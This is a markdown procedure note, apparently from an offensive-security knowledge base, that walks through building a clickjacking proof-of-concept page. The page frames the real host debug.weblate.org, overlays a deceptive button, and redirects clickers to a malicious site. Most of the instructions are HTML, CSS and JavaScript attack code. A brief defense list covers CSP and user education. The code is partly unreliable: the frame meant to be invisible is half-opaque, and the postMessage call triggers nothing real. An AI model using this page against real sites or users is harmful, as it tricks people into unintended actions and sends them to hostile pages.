---
tags:
  - clickjacking
  - poc
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:04.885Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
id: 10e85e89-b168-4d23-9a4d-95fa64d3d628
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-ClickJacking-PoC-HTML

## Summary

This procedure creates a proof-of-concept HTML page that embeds the vulnerable Weblate debug page in an iframe and overlays deceptive UI elements to trick users into clicking and performing unintended actions.

## Description

The PoC uses an invisible iframe to load https://debug.weblate.org/ and positions a transparent overlay with a clickable button (e.g., 'Report to CIA') aligned over interactive elements in the debug page. When clicked, it triggers actions in the iframe before redirecting the user to a malicious site, demonstrating UI redressing.

## Requirements

1. Text editor for HTML creation
2. Basic HTML, CSS, and JavaScript knowledge
3. Local file system access

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP to block inline scripts and iframes
- Educate users on phishing via deceptive overlays
- Log and alert on suspicious redirects from embedded content

## Objectives

1. Embed the vulnerable page in an iframe
2. Overlay deceptive clickable elements
3. Trigger iframe actions on user click

## Instructions

### Step 1: Set Up Basic HTML Structure

**Context**: Create the foundation for the malicious page.

Open a text editor and start with a basic HTML skeleton including an iframe and overlay div.

```html
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
    <iframe id="debug-frame" src="https://debug.weblate.org/" style="opacity:0.5;"></iframe>
    <div id="overlay" style="position:absolute; top:100px; left:100px;">
        <button onclick="exploit()">Report to CIA</button>
    </div>
</body>
</html>
```

> This embeds the debug page and adds an overlay button.

### Step 2: Style Overlay for Deception

**Context**: Make the overlay transparent and aligned to trick clicks.

Add CSS to position the overlay over iframe elements and make it semi-transparent.

```html
<style>
    #debug-frame { position: relative; width: 100%; height: 600px; }
    #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
    #overlay button { pointer-events: all; background: red; color: white; }
</style>
```

> Aligns the button over debug page controls for precise targeting.

### Step 3: Add JavaScript for Exploitation

**Context**: Handle click to perform action and redirect.

Implement the exploit function to post a message or simulate click in iframe, then redirect.

```javascript
<script>
function exploit() {
    var iframe = document.getElementById('debug-frame');
    iframe.contentWindow.postMessage('trigger-action', '*'); // Simulate interaction
    window.location.href = 'https://MaliciousSite.com';
}
</script>
```

> On click, interacts with iframe and redirects.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[poc]]
- [[html]]
